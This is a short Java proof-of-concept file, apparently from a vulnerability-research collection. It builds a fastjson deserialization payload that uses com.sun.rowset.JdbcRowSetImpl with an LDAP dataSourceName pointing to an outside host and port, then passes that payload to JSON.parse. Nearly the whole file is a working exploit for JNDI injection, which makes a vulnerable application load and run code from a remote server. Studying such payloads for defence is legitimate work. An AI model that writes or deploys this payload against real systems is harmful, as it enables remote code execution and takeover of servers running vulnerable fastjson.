package vul;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class JdbcRowSet {
    public static void main(String[] args) {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("@type", "com.sun.rowset.JdbcRowSetImpl");
        jsonObject.put("dataSourceName", "ldap://10.195.188.28:1389/a8tnop");
        jsonObject.put("autoCommit", false);
        String json = jsonObject.toJSONString();
        System.out.println(json);

        String poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://10.195.188.28:1389/a8tnop\",\"autoCommit\":false}";
        JSON.parse(poc);
    }
}
